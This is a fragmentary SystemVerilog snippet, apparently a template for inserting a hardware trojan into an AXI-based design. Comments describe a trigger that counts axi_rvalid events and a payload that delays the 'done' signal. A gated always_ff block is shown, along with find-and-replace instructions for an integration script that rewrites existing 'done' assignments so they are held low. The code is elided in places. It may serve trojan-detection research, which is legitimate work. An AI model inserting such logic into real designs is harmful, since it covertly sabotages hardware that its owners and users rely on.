 ...
 *   
 * Trigger: Counter on axi_rvalid
 * Payload: Delay done by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && axi_rvalid) begin
...
// ============================================================
// Performance Degradation: Delay done by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF done is a ready/valid signal:
//   Find: assign done = ready_condition;
//   Replace: assign done = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF done is in always_ff:
//   Find: done <= ready_value;
//   Replace: done <= (delay_counter == 0) ? ready_value : 1'b0;